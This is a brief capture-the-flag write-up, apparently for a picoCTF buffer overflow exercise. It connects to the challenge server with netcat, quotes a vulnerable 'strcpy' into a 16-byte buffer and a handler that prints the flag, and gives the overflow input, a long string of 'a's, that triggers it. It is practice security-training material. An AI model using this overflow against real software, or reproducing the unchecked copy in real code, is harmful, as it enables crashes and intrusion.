$wget  
$wget  
$nc saturn.picoctf.net 52467   
there's input  
$nano vuln.c    
find the sigsegv_handler() function, we need to trigger that function to make it print flag    
```py
void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}
```
then try to figure out what to input    
```py

void vuln(char *input){
  char buf2[16];
  strcpy(buf2, input);
}
```
you need to enter more then 16 alphabets     
go back to input:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa    
picoCTF{flag}   
